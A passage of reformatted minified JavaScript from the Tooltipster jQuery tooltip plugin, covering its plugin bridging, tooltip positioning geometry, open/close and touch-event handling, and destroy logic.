                    0 != t.indexOf("__") && (i[t] ? o.debug && console.log("The " + t + " method of the " + n + " plugin conflicts with another plugin or native methods") : (i[t] = function () {
                        return r[t].apply(r, Array.prototype.slice.apply(arguments))
                    }, i[t].bridged = r))
                })), i[n] = r
            }
            return this
        }, __setWindow: function (t) {
            return r.window = t, this
        }, _getRuler: function (t) {
            return new e(t)
        }, _off: function () {
            return this.__$emitterPrivate.off.apply(this.__$emitterPrivate, Array.prototype.slice.apply(arguments)), this
        }, _on: function () {
            return this.__$emitterPrivate.on.apply(this.__$emitterPrivate, Array.prototype.slice.apply(arguments)), this
        }, _one: function () {
            return this.__$emitterPrivate.one.apply(this.__$emitterPrivate, Array.prototype.slice.apply(arguments)), this
        }, _plugin: function (e) {
            var i = this;
            if ("string" == typeof e) {
                var n = e, o = null;
                return n.indexOf(".") > 0 ? o = i.__plugins[n] : t.each(i.__plugins, (function (t, e) {
                    return e.name.substring(e.name.length - n.length - 1) == "." + n ? (o = e, !1) : void 0
                })), o
            }
            if (e.name.indexOf(".") < 0) throw new Error("Plugins must be namespaced");
            return i.__plugins[e.name] = e, e.core && i.__bridge(e.core, i, e.name), this
        }, _trigger: function () {
            var t = Array.prototype.slice.apply(arguments);
            return "string" == typeof t[0] && (t[0] = {type: t[0]}), this.__$emitterPrivate.trigger.apply(this.__$emitterPrivate, t), this.__$emitterPublic.trigger.apply(this.__$emitterPublic, t), this
        }, instances: function (e) {
            var i = [];
            return t(e || ".tooltipstered").each((function () {
                var e = t(this), n = e.data("tooltipster-ns");
                n && t.each(n, (function (t, n) {
                    i.push(e.data(n))
                }))
            })), i
        }, instancesLatest: function () {
            return this.__instancesLatestArr
        }, off: function () {
            return this.__$emitterPublic.off.apply(this.__$emitterPublic, Array.prototype.slice.apply(arguments)), this
        }, on: function () {
            return this.__$emitterPublic.on.apply(this.__$emitterPublic, Array.prototype.slice.apply(arguments)), this
        }, one: function () {
            return this.__$emitterPublic.one.apply(this.__$emitterPublic, Array.prototype.slice.apply(arguments)), this
        }, origins: function (e) {
            return t((e ? e + " " : "") + ".tooltipstered").toArray()
        }, setDefaults: function (e) {
            return t.extend(o, e), this
        }, triggerHandler: function () {
            return this.__$emitterPublic.triggerHandler.apply(this.__$emitterPublic, Array.prototype.slice.apply(arguments)), this
        }
    }, t.tooltipster = new a, t.Tooltipster = function (e, i) {
        this.__callbacks = {
            close: [],
            open: []
        }, this.__closingTime, this.__Content, this.__contentBcr, this.__destroyed = !1, this.__$emitterPrivate = t({}), this.__$emitterPublic = t({}), this.__enabled = !0, this.__garbageCollector, this.__Geometry, this.__lastPosition, this.__namespace = "tooltipster-" + Math.round(1e6 * Math.random()), this.__options, this.__$originParents, this.__pointerIsOverOrigin = !1, this.__previousThemes = [], this.__state = "closed", this.__timeouts = {
            close: [],
            open: null
        }, this.__touchEvents = [], this.__tracker = null, this._$origin, this._$tooltip, this.__init(e, i)
    }, t.Tooltipster.prototype = {
        __init: function (e, i) {
            var n = this;
            if (n._$origin = t(e), n.__options = t.extend(!0, {}, o, i), n.__optionsFormat(), !r.IE || r.IE >= n.__options.IEmin) {
                var s = null;
                if (void 0 === n._$origin.data("tooltipster-initialTitle") && (void 0 === (s = n._$origin.attr("title")) && (s = null), n._$origin.data("tooltipster-initialTitle", s)), null !== n.__options.content) n.__contentSet(n.__options.content); else {
                    var a, l = n._$origin.attr("data-tooltip-content");
                    l && (a = t(l)), a && a[0] ? n.__contentSet(a.first()) : n.__contentSet(s)
                }
                n._$origin.removeAttr("title").addClass("tooltipstered"), n.__prepareOrigin(), n.__prepareGC(), t.each(n.__options.plugins, (function (t, e) {
                    n._plug(e)
                })), r.hasTouchCapability && t(r.window.document.body).on("touchmove." + n.__namespace + "-triggerOpen", (function (t) {
                    n._touchRecordEvent(t)
                })), n._on("created", (function () {
                    n.__prepareTooltip()
                }))._on("repositioned", (function (t) {
                    n.__lastPosition = t.position
                }))
            } else n.__options.disabled = !0
        }, __contentInsert: function () {
            var t = this, e = t._$tooltip.find(".tooltipster-content"), i = t.__Content;
            return t._trigger({
                type: "format", content: t.__Content, format: function (t) {
                    i = t
                }
            }), t.__options.functionFormat && (i = t.__options.functionFormat.call(t, t, {origin: t._$origin[0]}, t.__Content)), "string" != typeof i || t.__options.contentAsHTML ? e.empty().append(i) : e.text(i), t
        }, __contentSet: function (e) {
            return e instanceof t && this.__options.contentCloning && (e = e.clone(!0)), this.__Content = e, this._trigger({
                type: "updated",
                content: e
            }), this
        }, __destroyError: function () {
            throw new Error("This tooltip has been destroyed and cannot execute your method call.")
        }, __geometry: function () {
            var e = this, i = e._$origin, n = e._$origin.is("area");
            if (n) {
                var o = e._$origin.parent().attr("name");
                i = t('img[usemap="#' + o + '"]')
            }
            var s = i[0].getBoundingClientRect(), a = t(r.window.document), l = t(r.window), c = i, d = {
                available: {document: null, window: null},
                document: {size: {height: a.height(), width: a.width()}},
                window: {
                    scroll: {
                        left: r.window.scrollX || r.window.document.documentElement.scrollLeft,
                        top: r.window.scrollY || r.window.document.documentElement.scrollTop
                    }, size: {height: l.height(), width: l.width()}
                },
                origin: {
                    fixedLineage: !1,
                    offset: {},
                    size: {height: s.bottom - s.top, width: s.right - s.left},
                    usemapImage: n ? i[0] : null,
                    windowOffset: {bottom: s.bottom, left: s.left, right: s.right, top: s.top}
                }
            };
            if (n) {
                var u = e._$origin.attr("shape"), h = e._$origin.attr("coords");
                if (h && (h = h.split(","), t.map(h, (function (t, e) {
                    h[e] = parseInt(t)
                }))), "default" != u) switch (u) {
                    case"circle":
                        var p = h[0], f = h[1], g = h[2], m = f - g, v = p - g;
                        d.origin.size.height = 2 * g, d.origin.size.width = d.origin.size.height, d.origin.windowOffset.left += v, d.origin.windowOffset.top += m;
                        break;
                    case"rect":
                        var y = h[0], _ = h[1], w = h[2], b = h[3];
                        d.origin.size.height = b - _, d.origin.size.width = w - y, d.origin.windowOffset.left += y, d.origin.windowOffset.top += _;
                        break;
                    case"poly":
                        for (var x = 0, C = 0, $ = 0, S = 0, T = "even", k = 0; k < h.length; k++) {
                            var O = h[k];
                            "even" == T ? (O > $ && ($ = O, 0 === k && (x = $)), x > O && (x = O), T = "odd") : (O > S && (S = O, 1 == k && (C = S)), C > O && (C = O), T = "even")
                        }
                        d.origin.size.height = S - C, d.origin.size.width = $ - x, d.origin.windowOffset.left += x, d.origin.windowOffset.top += C
                }
            }
            for (e._trigger({
                type: "geometry",
                edit: function (t) {
                    d.origin.size.height = t.height, d.origin.windowOffset.left = t.left, d.origin.windowOffset.top = t.top, d.origin.size.width = t.width
                },
                geometry: {
                    height: d.origin.size.height,
                    left: d.origin.windowOffset.left,
                    top: d.origin.windowOffset.top,
                    width: d.origin.size.width
                }
            }), d.origin.windowOffset.right = d.origin.windowOffset.left + d.origin.size.width, d.origin.windowOffset.bottom = d.origin.windowOffset.top + d.origin.size.height, d.origin.offset.left = d.origin.windowOffset.left + d.window.scroll.left, d.origin.offset.top = d.origin.windowOffset.top + d.window.scroll.top, d.origin.offset.bottom = d.origin.offset.top + d.origin.size.height, d.origin.offset.right = d.origin.offset.left + d.origin.size.width, d.available.document = {
                bottom: {
                    height: d.document.size.height - d.origin.offset.bottom,
                    width: d.document.size.width
                },
                left: {height: d.document.size.height, width: d.origin.offset.left},
                right: {height: d.document.size.height, width: d.document.size.width - d.origin.offset.right},
                top: {height: d.origin.offset.top, width: d.document.size.width}
            }, d.available.window = {
                bottom: {
                    height: Math.max(d.window.size.height - Math.max(d.origin.windowOffset.bottom, 0), 0),
                    width: d.window.size.width
                },
                left: {height: d.window.size.height, width: Math.max(d.origin.windowOffset.left, 0)},
                right: {
                    height: d.window.size.height,
                    width: Math.max(d.window.size.width - Math.max(d.origin.windowOffset.right, 0), 0)
                },
                top: {height: Math.max(d.origin.windowOffset.top, 0), width: d.window.size.width}
            }; "html" != c[0].tagName.toLowerCase();) {
                if ("fixed" == c.css("position")) {
                    d.origin.fixedLineage = !0;
                    break
                }
                c = c.parent()
            }
            return d
        }, __optionsFormat: function () {
            return "number" == typeof this.__options.animationDuration && (this.__options.animationDuration = [this.__options.animationDuration, this.__options.animationDuration]), "number" == typeof this.__options.delay && (this.__options.delay = [this.__options.delay, this.__options.delay]), "number" == typeof this.__options.delayTouch && (this.__options.delayTouch = [this.__options.delayTouch, this.__options.delayTouch]), "string" == typeof this.__options.theme && (this.__options.theme = [this.__options.theme]), null === this.__options.parent ? this.__options.parent = t(r.window.document.body) : "string" == typeof this.__options.parent && (this.__options.parent = t(this.__options.parent)), "hover" == this.__options.trigger ? (this.__options.triggerOpen = {
                mouseenter: !0,
                touchstart: !0
            }, this.__options.triggerClose = {
                mouseleave: !0,
                originClick: !0,
                touchleave: !0
            }) : "click" == this.__options.trigger && (this.__options.triggerOpen = {
                click: !0,
                tap: !0
            }, this.__options.triggerClose = {click: !0, tap: !0}), this._trigger("options"), this
        }, __prepareGC: function () {
            var e = this;
            return e.__options.selfDestruction ? e.__garbageCollector = setInterval((function () {
                var i = (new Date).getTime();
                e.__touchEvents = t.grep(e.__touchEvents, (function (t, e) {
                    return i - t.time > 6e4
                })), n(e._$origin) || e.close((function () {
                    e.destroy()
                }))
            }), 2e4) : clearInterval(e.__garbageCollector), e
        }, __prepareOrigin: function () {
            var t = this;
            if (t._$origin.off("." + t.__namespace + "-triggerOpen"), r.hasTouchCapability && t._$origin.on("touchstart." + t.__namespace + "-triggerOpen touchend." + t.__namespace + "-triggerOpen touchcancel." + t.__namespace + "-triggerOpen", (function (e) {
                t._touchRecordEvent(e)
            })), t.__options.triggerOpen.click || t.__options.triggerOpen.tap && r.hasTouchCapability) {
                var e = "";
                t.__options.triggerOpen.click && (e += "click." + t.__namespace + "-triggerOpen "), t.__options.triggerOpen.tap && r.hasTouchCapability && (e += "touchend." + t.__namespace + "-triggerOpen"), t._$origin.on(e, (function (e) {
                    t._touchIsMeaningfulEvent(e) && t._open(e)
                }))
            }
            if (t.__options.triggerOpen.mouseenter || t.__options.triggerOpen.touchstart && r.hasTouchCapability) {
                e = "";
                t.__options.triggerOpen.mouseenter && (e += "mouseenter." + t.__namespace + "-triggerOpen "), t.__options.triggerOpen.touchstart && r.hasTouchCapability && (e += "touchstart." + t.__namespace + "-triggerOpen"), t._$origin.on(e, (function (e) {
                    !t._touchIsTouchEvent(e) && t._touchIsEmulatedEvent(e) || (t.__pointerIsOverOrigin = !0, t._openShortly(e))
                }))
            }
            if (t.__options.triggerClose.mouseleave || t.__options.triggerClose.touchleave && r.hasTouchCapability) {
                e = "";
                t.__options.triggerClose.mouseleave && (e += "mouseleave." + t.__namespace + "-triggerOpen "), t.__options.triggerClose.touchleave && r.hasTouchCapability && (e += "touchend." + t.__namespace + "-triggerOpen touchcancel." + t.__namespace + "-triggerOpen"), t._$origin.on(e, (function (e) {
                    t._touchIsMeaningfulEvent(e) && (t.__pointerIsOverOrigin = !1)
                }))
            }
            return t
        }, __prepareTooltip: function () {
            var e = this, i = e.__options.interactive ? "auto" : "";
            return e._$tooltip.attr("id", e.__namespace).css({
                "pointer-events": i,
                zIndex: e.__options.zIndex
            }), t.each(e.__previousThemes, (function (t, i) {
                e._$tooltip.removeClass(i)
            })), t.each(e.__options.theme, (function (t, i) {
                e._$tooltip.addClass(i)
            })), e.__previousThemes = t.merge([], e.__options.theme), e
        }, __scrollHandler: function (e) {
            var i = this;
            if (i.__options.triggerClose.scroll) i._close(e); else if (n(i._$origin) && n(i._$tooltip)) {
                if (e.target === r.window.document) i.__Geometry.origin.fixedLineage || i.__options.repositionOnScroll && i.reposition(e); else {
                    var o = i.__geometry(), s = !1;
                    if ("fixed" != i._$origin.css("position") && i.__$originParents.each((function (e, i) {
                        var n = t(i), r = n.css("overflow-x"), a = n.css("overflow-y");
                        if ("visible" != r || "visible" != a) {
                            var l = i.getBoundingClientRect();
                            if ("visible" != r && (o.origin.windowOffset.left < l.left || o.origin.windowOffset.right > l.right)) return s = !0, !1;
                            if ("visible" != a && (o.origin.windowOffset.top < l.top || o.origin.windowOffset.bottom > l.bottom)) return s = !0, !1
                        }
                        return "fixed" != n.css("position") && void 0
                    })), s) i._$tooltip.css("visibility", "hidden"); else if (i._$tooltip.css("visibility", "visible"), i.__options.repositionOnScroll) i.reposition(e); else {
                        var a = o.origin.offset.left - i.__Geometry.origin.offset.left,
                            l = o.origin.offset.top - i.__Geometry.origin.offset.top;
                        i._$tooltip.css({left: i.__lastPosition.coord.left + a, top: i.__lastPosition.coord.top + l})
                    }
                }
                i._trigger({type: "scroll", event: e})
            }
            return i
        }, __stateSet: function (t) {
            return this.__state = t, this._trigger({type: "state", state: t}), this
        }, __timeoutsClear: function () {
            return clearTimeout(this.__timeouts.open), this.__timeouts.open = null, t.each(this.__timeouts.close, (function (t, e) {
                clearTimeout(e)
            })), this.__timeouts.close = [], this
        }, __trackerStart: function () {
            var t = this, e = t._$tooltip.find(".tooltipster-content");
            return t.__options.trackTooltip && (t.__contentBcr = e[0].getBoundingClientRect()), t.__tracker = setInterval((function () {
                if (n(t._$origin) && n(t._$tooltip)) {
                    if (t.__options.trackOrigin) {
                        var o = t.__geometry(), s = !1;
                        i(o.origin.size, t.__Geometry.origin.size) && (t.__Geometry.origin.fixedLineage ? i(o.origin.windowOffset, t.__Geometry.origin.windowOffset) && (s = !0) : i(o.origin.offset, t.__Geometry.origin.offset) && (s = !0)), s || (t.__options.triggerClose.mouseleave ? t._close() : t.reposition())
                    }
                    if (t.__options.trackTooltip) {
                        var r = e[0].getBoundingClientRect();
                        r.height === t.__contentBcr.height && r.width === t.__contentBcr.width || (t.reposition(), t.__contentBcr = r)
                    }
                } else t._close()
            }), t.__options.trackerInterval), t
        }, _close: function (e, i, n) {
            var o = this, s = !0;
            if (o._trigger({
                type: "close", event: e, stop: function () {
                    s = !1
                }
            }), s || n) {
                i && o.__callbacks.close.push(i), o.__callbacks.open = [], o.__timeoutsClear();
                var a = function () {
                    t.each(o.__callbacks.close, (function (t, i) {
                        i.call(o, o, {event: e, origin: o._$origin[0]})
                    })), o.__callbacks.close = []
                };
                if ("closed" != o.__state) {
                    var l = !0, c = (new Date).getTime() + o.__options.animationDuration[1];
                    if ("disappearing" == o.__state && c > o.__closingTime && (l = !1), l) {
                        o.__closingTime = c, "disappearing" != o.__state && o.__stateSet("disappearing");
                        var d = function () {
                            clearInterval(o.__tracker), o._trigger({
                                type: "closing",
                                event: e
                            }), o._$tooltip.off("." + o.__namespace + "-triggerClose").removeClass("tooltipster-dying"), t(r.window).off("." + o.__namespace + "-triggerClose"), o.__$originParents.each((function (e, i) {
                                t(i).off("scroll." + o.__namespace + "-triggerClose")
                            })), o.__$originParents = null, t(r.window.document.body).off("." + o.__namespace + "-triggerClose"), o._$origin.off("." + o.__namespace + "-triggerClose"), o._off("dismissable"), o.__stateSet("closed"), o._trigger({
                                type: "after",
                                event: e
                            }), o.__options.functionAfter && o.__options.functionAfter.call(o, o, {
                                event: e,
                                origin: o._$origin[0]
                            }), a()
                        };
                        r.hasTransitions ? (o._$tooltip.css({
                            "-moz-animation-duration": o.__options.animationDuration[1] + "ms",
                            "-ms-animation-duration": o.__options.animationDuration[1] + "ms",
                            "-o-animation-duration": o.__options.animationDuration[1] + "ms",
                            "-webkit-animation-duration": o.__options.animationDuration[1] + "ms",
                            "animation-duration": o.__options.animationDuration[1] + "ms",
                            "transition-duration": o.__options.animationDuration[1] + "ms"
                        }), o._$tooltip.clearQueue().removeClass("tooltipster-show").addClass("tooltipster-dying"), o.__options.animationDuration[1] > 0 && o._$tooltip.delay(o.__options.animationDuration[1]), o._$tooltip.queue(d)) : o._$tooltip.stop().fadeOut(o.__options.animationDuration[1], d)
                    }
                } else a()
            }
            return o
        }, _off: function () {
            return this.__$emitterPrivate.off.apply(this.__$emitterPrivate, Array.prototype.slice.apply(arguments)), this
        }, _on: function () {
            return this.__$emitterPrivate.on.apply(this.__$emitterPrivate, Array.prototype.slice.apply(arguments)), this
        }, _one: function () {
            return this.__$emitterPrivate.one.apply(this.__$emitterPrivate, Array.prototype.slice.apply(arguments)), this
        }, _open: function (e, i) {
            var o = this;
            if (!o.__destroying && n(o._$origin) && o.__enabled) {
                var s = !0;
                if ("closed" == o.__state && (o._trigger({
                    type: "before", event: e, stop: function () {
                        s = !1
                    }
                }), s && o.__options.functionBefore && (s = o.__options.functionBefore.call(o, o, {
                    event: e,
                    origin: o._$origin[0]
                }))), !1 !== s && null !== o.__Content) {
                    i && o.__callbacks.open.push(i), o.__callbacks.close = [], o.__timeoutsClear();
                    var a, l = function () {
                        "stable" != o.__state && o.__stateSet("stable"), t.each(o.__callbacks.open, (function (t, e) {
                            e.call(o, o, {origin: o._$origin[0], tooltip: o._$tooltip[0]})
                        })), o.__callbacks.open = []
                    };
                    if ("closed" !== o.__state) a = 0, "disappearing" === o.__state ? (o.__stateSet("appearing"), r.hasTransitions ? (o._$tooltip.clearQueue().removeClass("tooltipster-dying").addClass("tooltipster-show"), o.__options.animationDuration[0] > 0 && o._$tooltip.delay(o.__options.animationDuration[0]), o._$tooltip.queue(l)) : o._$tooltip.stop().fadeIn(l)) : "stable" == o.__state && l(); else {
                        if (o.__stateSet("appearing"), a = o.__options.animationDuration[0], o.__contentInsert(), o.reposition(e, !0), r.hasTransitions ? (o._$tooltip.addClass("tooltipster-" + o.__options.animation).addClass("tooltipster-initial").css({
                            "-moz-animation-duration": o.__options.animationDuration[0] + "ms",
                            "-ms-animation-duration": o.__options.animationDuration[0] + "ms",
                            "-o-animation-duration": o.__options.animationDuration[0] + "ms",
                            "-webkit-animation-duration": o.__options.animationDuration[0] + "ms",
                            "animation-duration": o.__options.animationDuration[0] + "ms",
                            "transition-duration": o.__options.animationDuration[0] + "ms"
                        }), setTimeout((function () {
                            "closed" != o.__state && (o._$tooltip.addClass("tooltipster-show").removeClass("tooltipster-initial"), o.__options.animationDuration[0] > 0 && o._$tooltip.delay(o.__options.animationDuration[0]), o._$tooltip.queue(l))
                        }), 0)) : o._$tooltip.css("display", "none").fadeIn(o.__options.animationDuration[0], l), o.__trackerStart(), t(r.window).on("resize." + o.__namespace + "-triggerClose", (function (e) {
                            var i = t(document.activeElement);
                            (i.is("input") || i.is("textarea")) && t.contains(o._$tooltip[0], i[0]) || o.reposition(e)
                        })).on("scroll." + o.__namespace + "-triggerClose", (function (t) {
                            o.__scrollHandler(t)
                        })), o.__$originParents = o._$origin.parents(), o.__$originParents.each((function (e, i) {
                            t(i).on("scroll." + o.__namespace + "-triggerClose", (function (t) {
                                o.__scrollHandler(t)
                            }))
                        })), o.__options.triggerClose.mouseleave || o.__options.triggerClose.touchleave && r.hasTouchCapability) {
                            o._on("dismissable", (function (t) {
                                t.dismissable ? t.delay ? (h = setTimeout((function () {
                                    o._close(t.event)
                                }), t.delay), o.__timeouts.close.push(h)) : o._close(t) : clearTimeout(h)
                            }));
                            var c = o._$origin, d = "", u = "", h = null;
                            o.__options.interactive && (c = c.add(o._$tooltip)), o.__options.triggerClose.mouseleave && (d += "mouseenter." + o.__namespace + "-triggerClose ", u += "mouseleave." + o.__namespace + "-triggerClose "), o.__options.triggerClose.touchleave && r.hasTouchCapability && (d += "touchstart." + o.__namespace + "-triggerClose", u += "touchend." + o.__namespace + "-triggerClose touchcancel." + o.__namespace + "-triggerClose"), c.on(u, (function (t) {
                                if (o._touchIsTouchEvent(t) || !o._touchIsEmulatedEvent(t)) {
                                    var e = "mouseleave" == t.type ? o.__options.delay : o.__options.delayTouch;
                                    o._trigger({delay: e[1], dismissable: !0, event: t, type: "dismissable"})
                                }
                            })).on(d, (function (t) {
                                !o._touchIsTouchEvent(t) && o._touchIsEmulatedEvent(t) || o._trigger({
                                    dismissable: !1,
                                    event: t,
                                    type: "dismissable"
                                })
                            }))
                        }
                        o.__options.triggerClose.originClick && o._$origin.on("click." + o.__namespace + "-triggerClose", (function (t) {
                            o._touchIsTouchEvent(t) || o._touchIsEmulatedEvent(t) || o._close(t)
                        })), (o.__options.triggerClose.click || o.__options.triggerClose.tap && r.hasTouchCapability) && setTimeout((function () {
                            if ("closed" != o.__state) {
                                var e = "", i = t(r.window.document.body);
                                o.__options.triggerClose.click && (e += "click." + o.__namespace + "-triggerClose "), o.__options.triggerClose.tap && r.hasTouchCapability && (e += "touchend." + o.__namespace + "-triggerClose"), i.on(e, (function (e) {
                                    o._touchIsMeaningfulEvent(e) && (o._touchRecordEvent(e), o.__options.interactive && t.contains(o._$tooltip[0], e.target) || o._close(e))
                                })), o.__options.triggerClose.tap && r.hasTouchCapability && i.on("touchstart." + o.__namespace + "-triggerClose", (function (t) {
                                    o._touchRecordEvent(t)
                                }))
                            }
                        }), 0), o._trigger("ready"), o.__options.functionReady && o.__options.functionReady.call(o, o, {
                            origin: o._$origin[0],
                            tooltip: o._$tooltip[0]
                        })
                    }
                    if (o.__options.timer > 0) {
                        h = setTimeout((function () {
                            o._close()
                        }), o.__options.timer + a);
                        o.__timeouts.close.push(h)
                    }
                }
            }
            return o
        }, _openShortly: function (t) {
            var e = this, i = !0;
            if ("stable" != e.__state && "appearing" != e.__state && !e.__timeouts.open && (e._trigger({
                type: "start",
                event: t,
                stop: function () {
                    i = !1
                }
            }), i)) {
                var n = 0 == t.type.indexOf("touch") ? e.__options.delayTouch : e.__options.delay;
                n[0] ? e.__timeouts.open = setTimeout((function () {
                    e.__timeouts.open = null, e.__pointerIsOverOrigin && e._touchIsMeaningfulEvent(t) ? (e._trigger("startend"), e._open(t)) : e._trigger("startcancel")
                }), n[0]) : (e._trigger("startend"), e._open(t))
            }
            return e
        }, _optionsExtract: function (e, i) {
            var n = this, o = t.extend(!0, {}, i), s = n.__options[e];
            return s || (s = {}, t.each(i, (function (t, e) {
                var i = n.__options[t];
                void 0 !== i && (s[t] = i)
            }))), t.each(o, (function (e, i) {
                void 0 !== s[e] && ("object" != typeof i || i instanceof Array || null == i || "object" != typeof s[e] || s[e] instanceof Array || null == s[e] ? o[e] = s[e] : t.extend(o[e], s[e]))
            })), o
        }, _plug: function (e) {
            var i = t.tooltipster._plugin(e);
            if (!i) throw new Error('The "' + e + '" plugin is not defined');
            return i.instance && t.tooltipster.__bridge(i.instance, this, i.name), this
        }, _touchIsEmulatedEvent: function (t) {
            for (var e = !1, i = (new Date).getTime(), n = this.__touchEvents.length - 1; n >= 0; n--) {
                var o = this.__touchEvents[n];
                if (!(i - o.time < 500)) break;
                o.target === t.target && (e = !0)
            }
            return e
        }, _touchIsMeaningfulEvent: function (t) {
            return this._touchIsTouchEvent(t) && !this._touchSwiped(t.target) || !this._touchIsTouchEvent(t) && !this._touchIsEmulatedEvent(t)
        }, _touchIsTouchEvent: function (t) {
            return 0 == t.type.indexOf("touch")
        }, _touchRecordEvent: function (t) {
            return this._touchIsTouchEvent(t) && (t.time = (new Date).getTime(), this.__touchEvents.push(t)), this
        }, _touchSwiped: function (t) {
            for (var e = !1, i = this.__touchEvents.length - 1; i >= 0; i--) {
                var n = this.__touchEvents[i];
                if ("touchmove" == n.type) {
                    e = !0;
                    break
                }
                if ("touchstart" == n.type && t === n.target) break
            }
            return e
        }, _trigger: function () {
            var e = Array.prototype.slice.apply(arguments);
            return "string" == typeof e[0] && (e[0] = {type: e[0]}), e[0].instance = this, e[0].origin = this._$origin ? this._$origin[0] : null, e[0].tooltip = this._$tooltip ? this._$tooltip[0] : null, this.__$emitterPrivate.trigger.apply(this.__$emitterPrivate, e), t.tooltipster._trigger.apply(t.tooltipster, e), this.__$emitterPublic.trigger.apply(this.__$emitterPublic, e), this
        }, _unplug: function (e) {
            var i = this;
            if (i[e]) {
                var n = t.tooltipster._plugin(e);
                n.instance && t.each(n.instance, (function (t, n) {
                    i[t] && i[t].bridged === i[e] && delete i[t]
                })), i[e].__destroy && i[e].__destroy(), delete i[e]
            }
            return i
        }, close: function (t) {
            return this.__destroyed ? this.__destroyError() : this._close(null, t), this
        }, content: function (t) {
            var e = this;
            if (void 0 === t) return e.__Content;
            if (e.__destroyed) e.__destroyError(); else if (e.__contentSet(t), null !== e.__Content) {
                if ("closed" !== e.__state && (e.__contentInsert(), e.reposition(), e.__options.updateAnimation)) if (r.hasTransitions) {
                    var i = e.__options.updateAnimation;
                    e._$tooltip.addClass("tooltipster-update-" + i), setTimeout((function () {
                        "closed" != e.__state && e._$tooltip.removeClass("tooltipster-update-" + i)
                    }), 1e3)
                } else e._$tooltip.fadeTo(200, .5, (function () {
                    "closed" != e.__state && e._$tooltip.fadeTo(200, 1)
                }))
            } else e._close();
            return e
        }, destroy: function () {
            var e = this;
            if (e.__destroyed) e.__destroyError(); else {
                "closed" != e.__state && e.option("animationDuration", 0)._close(null, null, !0), e._trigger("destroy"), e.__destroyed = !0, e._$origin.removeData(e.__namespace).off("." + e.__namespace + "-triggerOpen"), t(r.window.document.body).off("." + e.__namespace + "-triggerOpen");
                var i = e._$origin.data("tooltipster-ns");
                if (i) if (1 === i.length) {
                    var n = null;
                    "previous" == e.__options.restoration ? n = e._$origin.data("tooltipster-initialTitle") : "current" == e.__options.restoration && (n = "string" == typeof e.__Content ? e.__Content : t("<div></div>").append(e.__Content).html()), n && e._$origin.attr("title", n), e._$origin.removeClass("tooltipstered"), e._$origin.removeData("tooltipster-ns").removeData("tooltipster-initialTitle")
                } else i = t.grep(i, (function (t, i) {
                    return t !== e.__namespace
                })), e._$origin.data("tooltipster-ns", i);
                e._trigger("destroyed"), e._off(), e.off(), e.__Content = null, e.__$emitterPrivate = null, e.__$emitterPublic = null, e.__options.parent = null, e._$origin = null, e._$tooltip = null, t.tooltipster.__instancesLatestArr = t.grep(t.tooltipster.__instancesLatestArr, (function (t, i) {
                    return e !== t
                })), clearInterval(e.__garbageCollector)
            }
            return e
        }, disable: function () {
            return this.__destroyed ? (this.__destroyError(), this) : (this._close(), this.__enabled = !1, this)
        }, elementOrigin: function () {
            return this.__destroyed ? void this.__destroyError() : this._$origin[0]
        }, elementTooltip: function () {
            return this._$tooltip ? this._$tooltip[0] : null
        }, enable: function () {
            return this.__enabled = !0, this
        }, hide: function (t) {
            return this.close(t)
        }, instance: function () {
            return this
        }, off: function () {
            return this.__destroyed || this.__$emitterPublic.off.apply(this.__$emitterPublic, Array.prototype.slice.apply(arguments)), this
        }, on: function () {
            return this.__destroyed ? this.__destroyError() : this.__$emitterPublic.on.apply(this.__$emitterPublic, Array.prototype.slice.apply(arguments)), this
        }, one: function () {
            return this.__destroyed ? this.__destroyError() : this.__$emitterPublic.one.apply(this.__$emitterPublic, Array.prototype.slice.apply(arguments)), this
        }, open: function (t) {
            return this.__destroyed ? this.__destroyError() : this._open(null, t), this
        }, option: function (e, i) {
            return void 0 === i ? this.__options[e] : (this.__destroyed ? this.__destroyError() : (this.__options[e] = i, this.__optionsFormat(), t.inArray(e, ["trigger", "triggerClose", "triggerOpen"]) >= 0 && this.__prepareOrigin(), "selfDestruction" === e && this.__prepareGC()), this)
        }, reposition: function (t, e) {
            var i = this;
            return i.__destroyed ? i.__destroyError() : "closed" != i.__state && n(i._$origin) && (e || n(i._$tooltip)) && (e || i._$tooltip.detach(), i.__Geometry = i.__geometry(), i._trigger({
                type: "reposition",
                event: t,
                helper: {geo: i.__Geometry}
            })), i
        }, show: function (t) {
            return this.open(t)
        }, status: function () {
            return {
                destroyed: this.__destroyed,
                enabled: this.__enabled,
                open: "closed" !== this.__state,
                state: this.__state
            }
        }, triggerHandler: function () {
            return this.__destroyed ? this.__destroyError() : this.__$emitterPublic.triggerHandler.apply(this.__$emitterPublic, Array.prototype.slice.apply(arguments)), this
        }
    }, t.fn.tooltipster = function () {
        var e = Array.prototype.slice.apply(arguments),
            i = "You are using a single HTML element as content for several tooltips. You probably want to set the contentCloning option to TRUE.";
        if (0 === this.length) return this;
        if ("string" == typeof e[0]) {
            var n = "#*$~&";
            return this.each((function () {
                var o = t(this).data("tooltipster-ns"), s = o ? t(this).data(o[0]) : null;
                if (!s) throw new Error("You called Tooltipster's \"" + e[0] + '" method on an uninitialized element');
                if ("function" != typeof s[e[0]]) throw new Error('Unknown method "' + e[0] + '"');
                this.length > 1 && "content" == e[0] && (e[1] instanceof t || "object" == typeof e[1] && null != e[1] && e[1].tagName) && !s.__options.contentCloning && s.__options.debug && console.log(i);
                var r = s[e[0]](e[1], e[2]);
                return r !== s || "instance" === e[0] ? (n = r, !1) : void 0
            })), "#*$~&" !== n ? n : this
        }
        t.tooltipster.__instancesLatestArr = [];
        var s = e[0] && void 0 !== e[0].multiple, r = s && e[0].multiple || !s && o.multiple,
            a = e[0] && void 0 !== e[0].content, l = a && e[0].content || !a && o.content,
            c = e[0] && void 0 !== e[0].contentCloning, d = c && e[0].contentCloning || !c && o.contentCloning,
            u = e[0] && void 0 !== e[0].debug, h = u && e[0].debug || !u && o.debug;
        return this.length > 1 && (l instanceof t || "object" == typeof l && null != l && l.tagName) && !d && h && console.log(i), this.each((function () {
            var i = !1, n = t(this), o = n.data("tooltipster-ns"), s = null;
            o ? r ? i = !0 : h && (console.log("Tooltipster: one or more tooltips are already attached to the element below. Ignoring."), console.log(this)) : i = !0, i && (s = new t.Tooltipster(this, e[0]), o || (o = []), o.push(s.__namespace), n.data("tooltipster-ns", o), n.data(s.__namespace, s), s.__options.functionInit && s.__options.functionInit.call(s, s, {origin: this}), s._trigger("init")), t.tooltipster.__instancesLatestArr.push(s)
        })), this
    }, e.prototype = {
        __init: function (e) {
            this.__$tooltip = e, this.__$tooltip.css({
                left: 0,
                overflow: "hidden",
                position: "absolute",
                top: 0
            }).find(".tooltipster-content").css("overflow", "auto"), this.$container = t('<div class="tooltipster-ruler"></div>').append(this.__$tooltip).appendTo(r.window.document.body)
        }, __forceRedraw: function () {
            var t = this.__$tooltip.parent();
